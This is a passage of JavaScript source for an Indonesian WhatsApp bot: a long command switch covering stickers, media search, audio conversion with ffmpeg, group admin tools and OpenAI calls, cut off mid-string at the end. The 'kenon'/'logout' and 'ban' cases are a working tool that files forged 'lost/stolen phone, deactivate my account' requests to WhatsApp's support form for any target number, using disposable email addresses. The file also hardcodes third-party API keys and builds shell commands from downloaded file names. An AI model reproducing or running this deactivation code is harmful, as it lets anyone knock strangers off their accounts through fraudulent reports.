kreyuk.sendMessage(kr.chat, { video: { url: anu.result }, mimetype: 'video/mp4', fileName: `${anu.title}.mp4` }, { quoted: kr })
break
	    case 'ppcp': {
                kr.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                kreyuk.sendMessage(kr.chat, { image: { url: random.male }, caption: `Cowoknya` }, { quoted: kr })
                kreyuk.sendMessage(kr.chat, { image: { url: random.female }, caption: `Ceweknya` }, { quoted: kr })
            }
	    break
case 'emojimix': {
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await kreyuk.sendImageAsSticker(kr.chat, res.url, kr, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break

//SEARCH MENU
case 'yts': case 'ytsearch': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n\n──────────────\n\n`
                }
                kreyuk.sendMessage(from, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: kr })
            }
break
  case 'gimage': {
 	if (!text) throw `Example : ${prefix + command} query`
kr.reply(mess.wait)
let gis = require('g-i-s')
gis(text, async (error, result) => {
let n = result
let images = n[Math.floor(Math.random() * n.length)].url
let buttons = [
    {buttonId: `.gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
    image: { url: images },
    caption: `* GIMAGE SEARCH 」*
 *Query* : ${text}
 *Media Url* : ${images}`,
    footer: ` © ${setting.botName} bot`,
    buttons: buttons,
    headerType: 4
}
kreyuk.sendMessage(from, buttonMessage, { quoted: kr })
})
}
           break
           case 'pinterest': {
       	if (!text) throw `Example : ${prefix + command} text`
kr.reply(mess.wait)         
         
		let { pinterest } = require('./lib/scraper')
                
anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
    {buttonId: `.pinterest ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
    image: { url: result },
    caption: `* PINTEREST SEARCH 」*
 *Query* : ${text}
 *Media Url* : ${result}`,
    footer: ` © ${setting.botName} bot`,
    buttons: buttons,
    headerType: 4
}
kreyuk.sendMessage(from, buttonMessage, { quoted: kr })}
break
case 'brainly':{
  
					if (args.length < 1) return kr.reply('Pertanyaan apa')
		  let brainly = require("brainly-scraper")

let res = await brainly(text)
let answer = res.data.map((v, i) => `_*PERTANYAAN KE ${i + 1}*_\n${v.pertanyaan}\n${v.jawaban.map((v,i) => `*JAWABAN KE ${i + 1}*\n${v.text}`).join('\n')}`).join('\n\n•------------•\n\n')
kr.reply(answer)
}
break
case 'bioskopnow': {
let skop = await bioskopNow()
let storee = '❉─────────────────────❉\n'
for (let i of skop ){
storee += `\n* *JADWAL BIOSKOP NOW* 」*\n
- *Judul* : ${i.title}
- *Link* : ${i.url}\n
- *Genre* : ${i.genre}
- *Durasi* : ${i.duration}
- *Tayang di* : ${i.playingAt}\n❉─────────────────────❉`
kr.reply(storee)
            }
}
break
//PRIMBON MENU
case 'artimimpi': case 'tafsirmimpi': {
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return kr.reply(anu.message)
                kreyuk.sendText(from, `• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`, kr)
            }
case 'artinama': {
                if (!text) throw `Example : ${prefix + command} masha`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return kr.reply(anu.message)
                kreyuk.sendText(from, 
`• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`, kr)
            }
            break
//OPEN AI
case 'ai': case 'openai': 
          try {
            if (setkey.keyopenai === 'ISI_APIKEY_OPENAI_DISINI') return kr.reply('Apikey belum diisi\n\nSilahkan isi terlebih dahulu apikeynya di file key.json\n\nApikeynya bisa dibuat di website: https://beta.openai.com/account/api-keys');
            if (!text) return kr.reply(`Chat dengan AI.\n\nContoh:\n${prefix}${command} Apa itu resesi`);
            const configuration = new Configuration({
              apiKey: setkey.keyopenai,
            });
            const openai = new OpenAIApi(configuration);

            const response = await openai.createCompletion({
              model: 'text-davinci-003',
              prompt: text,
              temperature: 0.3,
              max_tokens: 2000,
              top_p: 1.0,
              frequency_penalty: 0.0,
              presence_penalty: 0.0,
            });
            kr.reply(`${response.data.choices[0].text}`);
          } catch (error) {
          if (error.response) {
            console.log(error.response.status);
            console.log(error.response.data);
            console.log(`${error.response.status}\n\n${error.response.data}`);
          } else {
            console.log(error);
            kr.reply('Maaf, sepertinya ada yang error :'+ error.message);
          }
        }
          break;
        case 'img': case 'ai-img': case 'image': case 'images':
          try {
            if (setkey.keyopenai === 'ISI_APIKEY_OPENAI_DISINI') return reply('Apikey belum diisi\n\nSilahkan isi terlebih dahulu apikeynya di file key.json\n\nApikeynya bisa dibuat di website: https://beta.openai.com/account/api-keys');
            if (!text) return kr.reply(`Membuat gambar dari AI.\n\nContoh:\n${prefix}${command} Wooden house on snow mountain`);
            const configuration = new Configuration({
              apiKey: setkey.keyopenai,
            });
            const openai = new OpenAIApi(configuration);
            const response = await openai.createImage({
              prompt: text,
              n: 1,
              size: '512x512',
            });
            //console.log(response.data.data[0].url)
            kreyuk.sendImage(from, response.data.data[0].url, text, kr);
            } catch (error) {
          if (error.response) {
            console.log(error.response.status);
            console.log(error.response.data);
            console.log(`${error.response.status}\n\n${error.response.data}`);
          } else {
            console.log(error);
            kr.reply('Maaf, sepertinya ada yang error :'+ error.message);
          }
        }
        break
case 'akinator': {
                    if (akinator.hasOwnProperty(kr.sender.split('@')[0])) throw ("Selesein yg sebelumnya dulu atuh")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/akinator/start?apikey=8dfb68ce0e528ecb3ec40cbe}`)
                    let { server, frontaddr, session, signature, question, step } = `${get_result.result}`
                    const data = {}
                    data["server"] = server
                    data["frontaddr"] = frontaddr
                    data["session"] = session
                    data["signature"] = signature
                    data["question"] = question
                    data["step"] = step
                    imi_txt = `${question}\n\n`
                    imi_txt += "0 - Ya\n"
                    imi_txt += "1 - Tidak\n"
                    imi_txt += "2 - Saya Tidak Tau\n"
                    imi_txt += "3 - Mungkin\n"
                    imi_txt += "4 - Mungkin Tidak"
                    kreyuk.sendText(from, imi_txt, kr).then(() => {
                        akinator[kr.sender.split('@')[0]] = data
                        fs.writeFileSync("./src/akinator.json", JSON.stringify(akinator))
                    })}
                    break
                case 'cancelakinator': {
                    if (!akinator.hasOwnProperty(kr.sender.split('@')[0])) throw ("Anda tidak memiliki akinator sebelumnya")
                    delete akinator[kr.sender.split('@')[0]]
                    fs.writeFileSync("./src/akinator.json", JSON.stringify(akinator))
                    kr.reply("Success mengcancel akinator sebelumnya")}
break
//Info
case 'infogempbhjja': {
let result = await fetchJson(`https://saipulanuar.ga/api/info/gempa`)
let teks = `informasi gempa terbaru:\n\nWaktu: *${result.jam}*\nBujur: *${result.bujur}*\nLintang: *${result.lintang}*\nMagnitudo: *${result.magnitude}*\nKedalaman: *${result.kedalaman}*\nLokasi: *${result.wilayah}*`
let results = `${result.teks}`
kr.reply(`${results}`)
}

break
case 'infogempasfuijh': {
let scrapy = require("node-scrapy")

const model = ['tr:nth-child(1) td']
			fetch('https://www.bmkg.go.id/gempabumi/gempabumi-terkini.bmkg')
				let result = scrapy.extract(body, model)

				let waktu = result[1] || "Tidak ada data"
				let lintang = result[2] || "Tidak ada data"
				let bujur = result[3] || "Tidak ada data";
				let magnitudo = result[4] || "Tidak ada data"
				let kedalaman = result[5] || "Tidak ada data"
				let lokasi = result[6] || "Tidak ada data"

				const teks = `informasi gempa terbaru:\n\nWaktu: *${waktu}*\nBujur: *${bujur}*\nLintang: *${lintang}*\nMagnitudo: *${magnitudo}*\nKedalaman: *${kedalaman}*\nLokasi: *${lokasi}*`.trim()
                kr.reply(from, teks, { quoted : kr})
                
      }

break
//Convert AUDIO
  case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                kr.reply(mess.wait)
                let media = await kreyuk.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return kr.reply(err)
                let buff = fs.readFileSync(ran)
                kreyuk.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : kr })
                fs.unlinkSync(ran)
                })
                } else kr.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                kr.reply(e)
                }

break
case 'proses':{
let tek = (`「 *TRANSAKSI TERTUNDA* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${wita}WITA\n✨ STATUS  : Tertunda\`\`\`\n\n*--------------------------*\n\n*Pesanan ini akan diproses manual oleh admin,* *Tunggu admin memprosesnya🙏*`)
let btn_menu = [
{buttonId: `${prefix}aokeguwgw`, buttonText: { displayText: 'OKE SAYA TUNGGU👍' }, type: 1 },
]
kreyuk.sendMessage(from,
{text: tek,
buttons: btn_menu})
kreyuk.sendMessage(`${global.ownerNumber}`, {text: `Ada yang order Dari @${sender.split("@")[0]}`})
}
break
case 'done':{
let tek = (`「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih Telah order di *Ap Store*\nNext Order ya🙏`)
let btn_menu = [
{buttonId: `${prefix}aokeguwgw`, buttonText: { displayText: 'OKE THENKS👍' }, type: 1 },
]
kreyuk.sendMessage(from,
{text: tek,
buttons: btn_menu})
}
break
case 'join':
case 'jn': {
                if (!itsMeap) throw mess.owner
                if (!text) throw 'kirim link grup nya!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Salah!'
                kr.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await kreyuk.groupAcceptInvite(result).then((res) => kr.reply(jsonformat(res))).catch((err) => kr.reply(jsonformat(err)))
            }
            break
            case 'leavegc':
            case 'lgc': {
                if (!itsMeap) throw mess.owner
                await kreyuk.groupLeave(kr.chat).then((res) => kr.reply(jsonformat(res))).catch((err) => kr.reply(jsonformat(err)))
            }
            break
break
case 'swm': case 'stickerwm': case 'wm': case 'take': {  
if (!args.join(" ")) return kr.reply(`Contoh :\nswm ${global.author}|${global.packname}`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (kr.quoted.isAnimated === true) {
kreyuk.downloadAndSaveMediaMessage(quoted, "gifee")
kreyuk.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:kr})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await kreyuk.sendImageAsSticker(kr.chat, media, kr, { packname: pcknm, author: global.atnm })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return kr.reply('maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await kreyuk.sendVideoAsSticker(kr.chat, media, kr, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
kr.reply(`kirim video/poto dengan Caption ${prefix + command}\ndurasi vidio minimal 1-9 detik`)
}
}
break
case 'id':{
            kr.reply(from)
           }
          break
case 'welcohsusme':{
if (!isGroup) return kr.reply('Khusus Group!') 
if (!q) return kr.reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (q == 'ON' || q == 'on' || q == 'On') {
if (isWelcome) return reply('Sudah aktif✓')
welcomeJson.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcomeJson))
reply('Suksess mengaktifkan welcome di group:\n'+groupName)
} else if (q == 'OFF' || q == 'OF' || q == 'Of' || q == 'Off' || q == 'of' || q == 'off') {
welcomeJson.splice(from, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcomeJson))
kr.reply('Success menonaktifkan welcome di group:\n'+groupName)
} else { kr.reply('Kata kunci tidak ditemukan!') }
}
break
case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink':
case 'rl': {
if (!isGroup) return kr.reply(mess.group)
if (!isBotAdmins) return kr.reply(mess.botAdmin)
if (!isAdmins && !itsMeap) return kr.reply(mess.admin)
kreyuk.groupRevokeInvite(kr.chat)
}
break
case 'setdesc': case 'setdesk': case 'sd': {
                if (!isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await kreyuk.groupUpdateDescription(kr.chat, text).then((res) => kr.reply(mess.success)).catch((err) => kr.reply(jsonformat(err)))
            }
            break
case 'grouplink':
case 'gl': {
                if (!isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await kreyuk.groupInviteCode(kr.chat)
                kreyuk.sendText(kr.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, kr, { detectLink: true })
            }
            break
case 'setnama': case 'setsubject': {
                if (!isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await kreyuk.groupUpdateSubject(kr.chat, text).then((res) => kr.reply(mess.success)).catch((err) => kr.reply(jsonformat(err)))
            }
            break
           case 'setgrouppp': 
           case 'setgruppp': 
           case 'setgcpp': {
                if (!isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Kirim/balas poto dengan keterangan ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/balas poto dengan keterangan ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/balas poto dengan keterangan ${prefix + command}`
                let media = await kreyuk.downloadAndSaveMediaMessage(quoted)
                await kreyuk.updateProfilePicture(kr.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                kr.reply(mess.success)
                }
                break
            case 'tagall': {
                if (!isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
let teks = `TAG ALL

 🌿 *Message : ${q ? q : 'empty'}*\n\n`
                for (let mem of participants) {
                teks += ` @${mem.id.split('@')[0]}\n`
                }
                kreyuk.sendMessage(kr.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: kr })
                }
                break
case 'hidetag':
case 'h':  {
            if (!isGroup) throw mess.group
            if (!isBotAdmins) throw mess.botAdmin
            if (!isAdmins) throw mess.admin
            kreyuk.sendMessage(kr.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: kr })
            }
  break
case 'kick':
case 'k': {
if (!isGroup) throw `Gak bisa disini`
if (!isBotAdmins) throw `Saya Blum Jadi Admin`
if (!isAdmins) throw `luh siape`
let users = kr.mentionedJid[0] ? kr.mentionedJid[0] : kr.quoted ? kr.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kreyuk.groupParticipantsUpdate(kr.chat, [users], 'remove').then((res) => kr.reply(`otw kick`)).catch((err) => kr.reply(jsonformat(err)))
}
break
case 'sticker':
 case 's':
  case 'stickergif':
   case 'sgif': {
            if (!quoted) return kr.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
            kr.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await kreyuk.sendImageAsSticker(kr.chat, media, kr, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return kr.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await kreyuk.sendVideoAsSticker(kr.chat, media, kr, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                kr.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
case 'setppbot': {
                if (!itsMeap) return kr.reply(mess.owner)
                if (!quoted)return kr.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (!/image/.test(mime)) return kr.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return kr.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                let media = await kreyuk.downloadAndSaveMediaMessage(quoted)
                await kreyuk.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                kr.reply(`SUKSES✓`)
                }
                break
case 'gc':
if (!isGroup) return kr.reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return kr.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return kr.reply('Bot Harus menjadi admin')
if (args[0] == "s")  { kr.reply(`SUKSES✓`)
kreyuk.groupSettingUpdate(kr.chat, 'announcement').then((res) => kr.reply(jsonformat(res))).catch((err) => kr.reply(jsonformat(err)))
 } else if (args[0] == "o")  { kr.reply(`SUKSES✓`)
kreyuk.groupSettingUpdate(kr.chat, 'not_announcement').then((res) => kr.reply(jsonformat(res))).catch((err) => kr.reply(jsonformat(err)))
 } else {
kr.reply(`Kirim perintah #${command} _options_\nOptions : o & s\nContoh : ${prefix+command} o`)
}
break
case 'del':
case 'd': {
                if (!kr.quoted) throw false
                let { chat, fromMe, id, isBaileys } = kr.quoted
                if (!isBaileys) throw 'Pesan Bukan Dari Saya'
                kreyuk.sendMessage(kr.chat, { delete: { remoteJid: kr.chat, fromMe: true, id: kr.quoted.id, participant: kr.quoted.sender } })
            }
            break
//TOOLS
case 'toaud': case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
kr.reply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
kreyuk.sendMessage(from, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : kr })
}
break
case 'tomp3': {
if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
kr.reply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
kreyuk.sendMessage(from, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${kreyuk.user.name}.mp3`}, { quoted : kr })
}
break
case 'tovn': case 'toptt': {
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
kr.reply(mess.wait)
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
kreyuk.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted: kr })
}
break
case 'tourl': {
                kr.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await kreyuk.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    kr.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    kr.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
case 'bitly': {
if (!text) throw `Example: ${prefix + command} https://google.com (wajib https://)`
let result = await fetchJson(`https://danzzapi.xyz/api/shortlink/bitly?url=${text}&apikey=danzz`)
let results = `${result.result}`
kr.reply(`${results}`)
}
break
case 'ssweb': {

if (!text) throw `Example : ${prefix + command} www.apkpure.com`
  await kr.reply('_Tunggu Bentar Bang...️_')
  
   let img = await (await fetch(`https://shot.screenshotapi.net/screenshot?token=AGGBVR8-TPT4MQA-GK8JD2Z-ZSR9PKJ&url=${text}&output=image&file_type=png&wait_for_event=load`)).buffer()

  
   kreyuk.sendMessage(from, { image: img, caption: 'Tuh' }, { quoted: kr })
}
break
 case 'ttsen': {
         	if (!text) throw `Example : ${prefix + command} text`
         	kr.reply(mess.wait)
             let tts = await fetchJson(`https://danzzapi.xyz/api/tools/tts?text=${text}&lang=id-ID&apikey=danzz`)
             kreyuk.sendMessage(from, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true }, { quoted: kr })
         	}
         break
         
         case 'ttsid': {
         	if (!text) throw `Example : ${prefix + command} text`
         	kr.reply(mess.wait)
             let tts = await fetchJson(`https://danzzapi.xyz/api/tools/tts?text=${text}&lang=id-ID&apikey=danzz`)
             kreyuk.sendMessage(from, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true }, { quoted: kr })
         	}
         break
         
         case 'ttsja': case 'ttsjp': {
         	if (!text) throw `Example : ${prefix + command} text`
         	kr.reply(mess.wait)
             let tts = await fetchJson(`https://danzzapi.xyz/api/tools/tts?text=${text}&lang=ja-JP&apikey=danzz`)
             kreyuk.sendMessage(from, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true }, { quoted: kr })
         	}
         break
         
         case 'ttsko': case 'ttskr': {
         	if (!text) throw `Example : ${prefix + command} text`
         	kr.reply(mess.wait)
             let tts = await fetchJson(`https://danzzapi.xyz/api/tools/tts?text=${text}&lang=ko-KR&apikey=danzz`)
             kreyuk.sendMessage(from, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true }, { quoted: kr })
         	}
         	break
case 'translatejdjjdjdjde': {

let result = await fetchJson(`https://danzzapi.xyz/api/tools/translate?text=${text}&lang=en&apikey=danzz`)
results = `${result.result}`
reply(`${results}`)
}
            break
case 'kenon':
      case 'logout':
case 'verif': {
   if (!itsMeap) return kr.reply(`Nomer Mu Blum Vip Nih, Beli Vip Ke Owner`)
 if (!q) return kr.reply(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
kr.reply(`succes ${command} ke nomer tersebut\n
note :
jika no masih centang 2 atau aktif no tersebut sudah terkena ${command} sebelumnya....`)
}
 break
case 'ban':
case 'banned':  {
            	if (!itsMeap) return kr.reply(`Nomer Mu Blum Vip Nih, Beli Vip Ke Owner`)
 if (!q) return kr.reply(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
kr.reply(`succes ${command} ke nomer tersebut\n
note :
jika no masih centang 2 atau aktif no tersebut sudah terkena ${command} sebelumnya....`)
}
 break
case 'restart':{
 if (!isGroup) kr.reply(`Mana bisa di sini tolol`)
if (!isGroupAdmins) return kr.reply(`Hanya Bisa Di Gunakan Oleh Admin`)
        txts = `Sukses✓`
        kr.reply(txts)
 let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
  let o
  try {
  o = exec('pm2 restart all')
  } catch (e) {
  o = e
 } finally {
let { stdout, stderr } = o
}
}
break
case 'rules':
textrules = `
╔══》 𝙍𝙐𝙇𝙀𝙎
╠➥ 𝐍𝐎 𝐒𝐏𝐀𝐌 𝐁𝐎𝐓
╠➥ 𝐍𝐎 𝐓𝐄𝐋𝐏𝐎𝐍 𝐁𝐎𝐓
╠➥ 𝐉𝐄𝐃𝐀 𝐌𝐈𝐍𝐈𝐌𝐀𝐋 𝟓 𝐌𝐄??𝐈𝐓
╚═════════════════
`
kr.reply(textrules)
break
case 'ping': case 'botstatus': case 'statusbot': case 'test': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                kr.reply(respon)
            }
            break
case 'runtime':
case 'info': {
let timestamp = speed()
                let latensi = speed() - timestamp
            	let lowq = `Bot Sudah Aktif Selama:\n⏱️ : ${runtime(process.uptime())}
🕓 : ${wita} WITA
